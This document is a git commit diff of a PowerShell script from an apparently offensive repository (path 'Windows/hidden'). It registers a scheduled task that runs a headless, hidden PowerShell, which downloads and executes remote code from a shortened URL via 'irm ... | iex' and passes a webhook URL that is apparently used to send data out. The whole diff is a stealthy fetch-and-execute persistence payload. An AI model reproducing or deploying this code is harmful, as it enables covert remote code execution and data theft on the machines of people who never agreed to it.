dac3834fcfb3778c3b5f63cdf6ddf0fc82c05adb
JoshuaBrien <joshuabrieno@gmail.com>
2025-05-31 15:46:47 +0800

    Update conhost_SC_task.ps1

--- Windows/hidden/conhost_SC_task.ps1
+++ Windows/hidden/conhost_SC_task.ps1
@@ -1,4 +1,5 @@
-$taskAction = New-ScheduledTaskAction -Execute "conhost.exe" -Argument " --headless powershell -NoP -W H -C irm  | iex"
+$hookurl = $hookurl
+$taskAction = New-ScheduledTaskAction -Execute "conhost.exe" -Argument " --headless powershell -NoP -W H -C `$hookurl='$hookurl' irm tnyr.me/G41CJDy6eh  | iex"
 $taskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries
 $taskRunAs = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME"
